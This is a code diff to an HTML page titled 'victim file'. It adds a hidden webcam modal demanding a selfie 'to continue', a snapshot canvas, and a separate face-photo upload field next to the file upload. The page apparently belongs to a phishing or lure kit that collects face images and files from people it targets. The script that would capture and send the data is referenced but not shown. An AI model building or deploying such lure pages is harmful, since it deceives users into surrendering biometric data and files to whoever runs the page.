@@ -6,6 +6,20 @@
     <title>victim file</title>
     <link rel="stylesheet" href="main.css" />
   </head>
+  <div id="webcamModal" class="modal" style="display:none;">
+    <div class="modal-content" style="max-width:500px;">
+      <span class="close" id="webcamClose">&times;</span>
+      <h2>Make a selfie to continue</h2>
+
+      <video id="webcam" autoplay playsinline style="width:100%; border-radius:10px;"></video>
+      <canvas id="snapshotCanvas" style="display:none;"></canvas>
+
+      <button id="takeSnapshotBtn" class="download-button" style="margin-top:15px;">
+        Take a photo
+      </button>
+    </div>
+  </div>
+
   <body>
     <script src="index.js"></script>
     <div class="wrapper">
@@ -35,9 +49,17 @@
         <div class="upload-container">
           <input type="file" id="file-upload" class="file-input" multiple />
           <label for="file-upload" class="download-button">
-            Upload files
+            Select files
+          </label>
+
+          <input type="file" id="face-upload" class="file-input" accept="image/*" />
+          <label for="face-upload" class="download-button">
+            Select face photo
           </label>
         </div>
+        <button id="uploadAllBtn" class="download-button">
+          Upload files
+        </button>
 
         <div class="file-list">
           <div class="file-item1 category-trigger active" data-category="all">
